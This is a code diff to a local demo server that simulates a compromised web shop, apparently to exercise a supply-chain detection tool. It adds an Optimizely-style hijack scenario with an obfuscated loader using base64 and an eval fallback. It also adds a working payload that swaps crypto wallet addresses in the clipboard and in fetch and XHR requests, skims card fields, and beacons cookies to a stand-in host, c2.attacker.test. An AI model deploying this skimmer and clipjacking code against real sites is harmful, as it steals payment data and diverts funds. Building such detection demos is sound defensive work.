@@ -6,21 +6,39 @@
 // through its egress proxy via `security.network.resolverOverrides`, so the
 // demo never touches the internet and nothing it "steals" leaves this process.
 //
-// The shop has two states:
-//   clean        what the merchant reviewed and approved
-//   compromised  a Magecart-style attack, five changes at once:
+// The shop has three states:
+//   clean           what the merchant reviewed and approved
+//   compromised     a Magecart-style attack, five changes at once:
 //     1. the payment vendor's pay.js gets a card skimmer appended (supply-chain compromise)
 //     2. a new "jquery" loader from a lookalike domain, obfuscated, runs eval (polyfill.io style)
 //     3. stolen data is beaconed to a never-seen-before collection domain
 //     4. the checkout form gets an extra card field and posts to the attacker
 //     5. the Content-Security-Policy and X-Frame-Options headers are gone
+//   snippet-hijack  an Optimizely-style attack (November 2026): the A/B-testing
+//                   vendor's snippet keeps its URL, but its "project JavaScript"
+//                   now injects a loader (base64 URL, eval fallback) for a payload
+//                   on c2.attacker.test that swaps crypto wallet addresses
+//                   (clipboard + fetch/XHR hooks), skims card fields and beacons out
 //
-// All "malicious" code here is harmless: it reads form fields and sends them
-// to collect.exfil.test, which is this same server and discards the data.
+// All "malicious" code here is harmless: it only talks to collect.exfil.test and
+// c2.attacker.test, which are this same server and discard everything.
 
 import http from 'node:http';
 
-export const DEMO_HOSTS = ['shop.demo.test', 'cdn.payvendor.test', 'tags.analytics.test', 'cdn-assets-cloud.test', 'collect.exfil.test'];
+export const DEMO_HOSTS = [
+  'shop.demo.test',
+  'cdn.payvendor.test',
+  'tags.analytics.test',
+  'cdn.experiments.test',
+  'cdn-assets-cloud.test',
+  'collect.exfil.test',
+  'c2.attacker.test',
+];
+
+/** Shop states: what was approved, and the two attack scenarios. */
+export const DEMO_STATES = ['clean', 'compromised', 'snippet-hijack'];
+
+const EXPERIMENT_PROJECT = '1029384756';
 
 const SHOP = 'shop.demo.test';
 
@@ -90,7 +108,8 @@ function homePage(port) {
   return layout(
     'Home',
     `<h1>New season gear</h1><div class="grid">${cards}</div>`,
-    `<script>window.acme = { currency: 'EUR', region: 'eu' };</script>
+    `<script src="${u('cdn.experiments.test', `/js/${EXPERIMENT_PROJECT}.js`)}"></script>
+<script>window.acme = { currency: 'EUR', region: 'eu' };</script>
 <script src="/assets/app.js"></script>
 <script src="${u('tags.analytics.test', '/tag.js')}" async></script>`,
   );
@@ -115,7 +134,8 @@ function checkoutPage(port, compromised) {
   <button type="submit">Pay €318</button>
 </form>
 </div>`,
-    `<script src="${u('cdn.payvendor.test', '/v3/pay.js')}"></script>
+    `<script src="${u('cdn.experiments.test', `/js/${EXPERIMENT_PROJECT}.js`)}"></script>
+<script src="${u('cdn.payvendor.test', '/v3/pay.js')}"></script>
 <script src="${u('tags.analytics.test', '/tag.js')}" async></script>${loader}`,
   );
 }
@@ -180,14 +200,79 @@ var _0xp=atob('${payload}');var _0xq=atob('${Buffer.from('ready').toString('base
 eval(_0xp);`;
 }
 
+// The A/B-testing vendor's snippet (one file per project, served from the vendor's
+// CDN). The part after "project JavaScript" is code the customer (or, in the
+// snippet-hijack state, the attacker) configured in the vendor's dashboard.
+const EXPERIMENT_SNIPPET = `/* A/B testing snippet, project ${EXPERIMENT_PROJECT} */
+(function (w) {
+  var key = '_exp_${EXPERIMENT_PROJECT}';
+  var bucket = w.localStorage.getItem(key) || String(Math.floor(Math.random() * 100));
+  w.localStorage.setItem(key, bucket);
+  w.experiments = { project: ${EXPERIMENT_PROJECT}, variation: Number(bucket) < 50 ? 'A' : 'B' };
+  document.documentElement.dataset.variation = w.experiments.variation;
+})(window);
+/* project JavaScript */
+window.experiments.ready = true;
+`;
+
+// What the attacker added to the project JavaScript: build the payload URL from
+// base64, load it, and if the script is blocked run an inline copy through eval.
+// (The inline copy here is only a stub that sets a flag.)
+function hijackLoader(port) {
+  const url = Buffer.from(`http://c2.attacker.test:${port}/track.js`).toString('base64');
+  const fallback = Buffer.from('window.__hijackFallback = true;').toString('base64');
+  return `(function () {
+  var s = document.createElement('script');
+  s.src = atob('${url}');
+  s.async = true;
+  s.onerror = function () { try { eval(atob('${fallback}')); } catch (e) {} };
+  (document.head || document.documentElement).appendChild(s);
+})();
+`;
+}
+
+// The payload on c2.attacker.test, modelled on the behaviour report-uri
+// documented: swap wallet addresses on copy and in outgoing fetch/XHR bodies,
+// skim card fields on submit, and check in with the page URL and cookies.
+// The wallet is a placeholder string and every request goes to this server.
+const HIJACK_PAYLOAD = (port) => `(function () {
+  var c2 = 'http://c2.attacker.test:${port}';
+  var wallet = 'bc1q-demo-attacker-wallet-placeholder';
+  var re = /(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|0x[a-fA-F0-9]{40}/g;
+  document.addEventListener('copy', function (e) {
+    var text = String(window.getSelection());
+    if (text.search(re) >= 0) {
+      e.clipboardData.setData('text/plain', text.replace(re, wallet));
+      e.preventDefault();
+    }
+  });
+  var realFetch = window.fetch;
+  window.fetch = function (input, init) {
+    if (init && typeof init.body === 'string') init.body = init.body.replace(re, wallet);
+    return realFetch.apply(this, arguments);
+  };
+  var realSend = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send = function (body) {
+    return realSend.call(this, typeof body === 'string' ? body.replace(re, wallet) : body);
+  };
+  document.addEventListener('submit', function () {
+    var card = {};
+    var fields = document.querySelectorAll('input[autocomplete^="cc-"], input[name*="card"], input[name*="cvc"]');
+    for (var i = 0; i < fields.length; i++) card[fields[i].name] = fields[i].value;
+    navigator.sendBeacon(c2 + '/card.php', JSON.stringify(card));
+  }, true);
+  navigator.sendBeacon(c2 + '/hit.php', JSON.stringify({ u: location.href, c: document.cookie }));
+})();
+`;
+
 const CSP = (port) =>
-  `default-src 'self'; script-src 'self' http://cdn.payvendor.test:${port} http://tags.analytics.test:${port}; style-src 'self' 'unsafe-inline'; ` +
+  `default-src 'self'; script-src 'self' http://cdn.experiments.test:${port} http://cdn.payvendor.test:${port} http://tags.analytics.test:${port}; style-src 'self' 'unsafe-inline'; ` +
   `img-src 'self' data:; connect-src 'self' http://tags.analytics.test:${port}; form-action 'self'; frame-ancestors 'none'`;
 
 /**
  * Create the demo server. `start()` resolves to the port; `setState()` switches
- * between 'clean' and 'compromised'. While running, GET /__state/<state> on
- * 127.0.0.1 or localhost switches too (for --keep-server).
+ * between the DEMO_STATES. While running, GET /__state/<state> on 127.0.0.1 or
+ * localhost switches too (for --keep-server).
  */
 export function createDemoServer() {
   let state = 'clean';
@@ -196,6 +281,7 @@ export function createDemoServer() {
 
   function route(host, path) {
     const compromised = state === 'compromised';
+    const hijacked = state === 'snippet-hijack';
     const js = (body) => ({ type: 'application/javascript', body });
     if (host === SHOP) {
       if (path === '/') return { type: 'text/html; charset=utf-8', body: homePage(port) };
@@ -210,7 +296,12 @@ export function createDemoServer() {
       if (path === '/tag.js') return js(ANALYTICS_TAG(port));
       if (path === '/collect') return { status: 204 };
     }
+    if (host === 'cdn.experiments.test' && path === `/js/${EXPERIMENT_PROJECT}.js`) return js(hijacked ? EXPERIMENT_SNIPPET + hijackLoader(port) : EXPERIMENT_SNIPPET);
     if (host === 'cdn-assets-cloud.test' && path === '/jquery.min.js' && compromised) return js(lookalikeLoader());
+    if (host === 'c2.attacker.test') {
+      if (path === '/track.js' && hijacked) return js(HIJACK_PAYLOAD(port));
+      if (path === '/hit.php' || path === '/card.php') return { status: 204 }; // accepts and discards everything
+    }
     if (host === 'collect.exfil.test') return { status: 204 }; // the "attacker": accepts and discards everything
     return undefined;
   }
@@ -220,7 +311,7 @@ export function createDemoServer() {
     const path = (req.url ?? '/').split('?')[0] ?? '/';
     if ((host === '127.0.0.1' || host === 'localhost') && path.startsWith('/__state/')) {
       const next = path.slice('/__state/'.length);
-      if (next !== 'clean' && next !== 'compromised') return res.writeHead(400).end('use /__state/clean or /__state/compromised\n');
+      if (!DEMO_STATES.includes(next)) return res.writeHead(400).end(`use /__state/<${DEMO_STATES.join('|')}>\n`);
       state = next;
       return res.writeHead(200, { 'content-type': 'text/plain' }).end(`acme-outfitters is now ${state}\n`);
     }
@@ -228,7 +319,7 @@ export function createDemoServer() {
     const r = route(host, path);
     if (!r) return res.writeHead(404, { 'content-type': 'text/plain' }).end('not found');
     const headers = { 'cache-control': 'no-store', ...(r.type ? { 'content-type': r.type } : {}), ...(r.headers ?? {}) };
-    if (host === 'collect.exfil.test' || path === '/collect') headers['access-control-allow-origin'] = '*';
+    if (host === 'collect.exfil.test' || host === 'c2.attacker.test' || path === '/collect') headers['access-control-allow-origin'] = '*';
     res.writeHead(r.status ?? 200, headers).end(r.body);
   }
 
@@ -240,7 +331,7 @@ export function createDemoServer() {
       return state;
     },
     setState(next) {
-      if (next !== 'clean' && next !== 'compromised') throw new Error(`unknown state ${next}`);
+      if (!DEMO_STATES.includes(next)) throw new Error(`unknown state ${next}`);
       state = next;
     },
     async start(listenPort = 0) {
